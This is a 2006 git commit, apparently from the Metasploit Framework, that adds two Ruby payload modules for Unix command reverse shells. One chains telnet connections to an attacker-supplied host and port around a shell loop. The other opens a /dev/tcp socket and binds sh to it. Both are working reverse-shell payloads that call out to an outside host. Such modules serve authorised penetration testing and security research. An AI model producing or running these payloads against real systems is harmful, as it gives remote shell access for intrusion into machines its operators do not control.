884fffa28c3117e34c6f24b892702c493b12b3ae
HD Moore <hd_moore@rapid7.com>
2006-01-14 20:12:53 +0000

    Ported the unix revers command payloads and handler
    git-svn-id: file:///home/svn/incoming/trunk@3372 4d416f70-5f16-0410-b530-b9f4589650da

---
+++ modules/payloads/singles/cmd/unix/reverse.rb
@@ -0,0 +1,55 @@
+require 'msf/core'
+require 'msf/core/handler/reverse_tcp_double'
+require 'msf/base/sessions/command_shell'
+
+module Msf
+module Payloads
+module Singles
+module Cmd
+module Unix
+
+module Reverse
+
+	include Msf::Payload::Single
+
+	def initialize(info = {})
+		super(merge_info(info,
+			'Name'          => 'Unix Command, Double reverse TCP connection (telnet)',
+			'Version'       => '$Revision$',
+			'Description'   => 'Creates an interactive shell through two inbound connections',
+			'Author'        => 'hdm',
+			'Platform'      => 'unix',
+			'Arch'          => ARCH_CMD,
+			'Handler'       => Msf::Handler::ReverseTcpDouble,
+			'Session'       => Msf::Sessions::CommandShell,
+			'PayloadType'   => 'cmd',
+			'Payload'       =>
+				{
+					'Offsets' => { },
+					'Payload' => ''
+				}
+			))
+	end
+
+	#
+	# Constructs the payload
+	#
+	def generate
+		return super + command_string
+	end
+	
+	#
+	# Returns the command string to use for execution
+	#
+	def command_string
+		cmd =
+			"sleep 7200|" +
+    		"telnet #{datastore['LHOST']} #{datastore['LPORT']}|" +
+    		"while : ; do sh && break; done 2>&1|" +
+    		"telnet #{datastore['LHOST']} #{datastore['LPORT']}"
+		return cmd
+	end
+
+end
+
+end end end end end
---
+++ modules/payloads/singles/cmd/unix/reverse_bash.rb
@@ -0,0 +1,50 @@
+require 'msf/core'
+require 'msf/core/handler/reverse_tcp_double'
+require 'msf/base/sessions/command_shell'
+
+module Msf
+module Payloads
+module Singles
+module Cmd
+module Unix
+
+module Reverse
+
+	include Msf::Payload::Single
+
+	def initialize(info = {})
+		super(merge_info(info,
+			'Name'          => 'Unix Command, Double reverse TCP connection (/dev/tcp)',
+			'Version'       => '$Revision$',
+			'Description'   => 'Creates an interactive shell through two inbound connections',
+			'Author'        => 'hdm',
+			'Platform'      => 'unix',
+			'Arch'          => ARCH_CMD,
+			'Handler'       => Msf::Handler::ReverseTcpDouble,
+			'Session'       => Msf::Sessions::CommandShell,
+			'PayloadType'   => 'cmd_bash',
+			'Payload'       =>
+				{
+					'Offsets' => { },
+					'Payload' => ''
+				}
+			))
+	end
+
+	#
+	# Constructs the payload
+	#
+	def generate
+		return super + command_string
+	end
+	
+	#
+	# Returns the command string to use for execution
+	#
+	def command_string
+		return "exec 13<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']};sh <&13 >&13";
+	end
+
+end
+
+end end end end end
